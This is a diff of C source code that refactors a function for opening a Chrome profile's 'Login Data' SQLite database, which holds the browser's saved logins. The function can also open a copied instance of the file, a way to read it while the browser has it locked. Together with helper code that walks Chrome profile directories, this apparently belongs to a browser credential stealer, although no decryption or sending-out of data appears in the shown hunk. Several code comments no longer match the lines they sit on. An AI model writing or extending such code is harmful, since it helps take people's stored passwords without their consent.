@@ -141,34 +141,25 @@ BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir
 }
 
 // Open database connection
-BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize) {
+BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance) {
 	errno_t err;
 	int status;
-	CHAR copy_chrome_dir_char[MAX_PATH] = "\0";
+	CHAR temp_database_location[MAX_PATH] = "\0";
 
-	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);)
+	if ((err = strcat_s(temp_database_location, MAX_PATH, database_location)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to database_location error: %d\n", err);)
 		return FALSE;
-	}
-	if ((err = strcat_s(chrome_dir_char, MAX_PATH, profile_name)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);)
-		return FALSE;
-	}
-	if ((err = strcat_s(copy_chrome_dir_char, MAX_PATH, chrome_dir_char)) != 0) {									// Append '\Login Data' to end of chrome_dir_char
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Initializing copy_chrome_dir_char error: %d\n", err);)
-			return FALSE;
-	}
-	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);)
-		return FALSE;
-	}
-	if ((err = strcat_s(copy_chrome_dir_char, MAX_PATH, "\\Login Data2")) != 0) {									// Append '\Login Data2' to end of chrome_dir_char
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data2' to copy_chrome_dir_char error: %d\n", err);)
-			return FALSE;
 	}
 
-	if ((status = sqlite3_open_v2(chrome_dir_char, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection to '%s', error: %s:%d\n", profile_name, sqlite3_errmsg(*(sqlite3**)handle_db), status);)
+	if (open_copied_instance) {
+		if ((err = strcat_s(temp_database_location, MAX_PATH, "2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
+			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending profile name to database_location error: %d\n", err);)
+			return FALSE;
+		}
+	}
+
+	if ((status = sqlite3_open_v2(temp_database_location, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
 		return FALSE;
 	}
 
